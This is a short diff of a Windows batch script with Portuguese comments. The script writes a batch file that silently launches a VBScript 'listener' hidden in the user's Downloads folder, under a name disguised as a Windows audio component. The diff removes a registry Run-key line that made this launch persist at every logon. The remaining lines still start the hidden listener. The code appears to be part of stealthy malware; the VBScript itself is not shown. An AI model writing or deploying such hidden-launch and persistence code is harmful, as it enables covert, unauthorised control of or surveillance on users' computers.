@@ -15,9 +15,6 @@ echo @echo off > "%USERPROFILE%\Downloads\audio.bat"
 echo start "" /B wscript.exe //nologo "%USERPROFILE%\Downloads\audio.vbs" >> "%USERPROFILE%\Downloads\audio.bat"
 echo exit >> "%USERPROFILE%\Downloads\audio.bat"
 
-:: Registrar no Windows
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsAudio" /t REG_SZ /d "%USERPROFILE%\Downloads\audio.bat" /f > nul 2>&1
-
 :: Iniciar listener
 start "" /B wscript.exe //nologo "%USERPROFILE%\Downloads\audio.vbs"
 
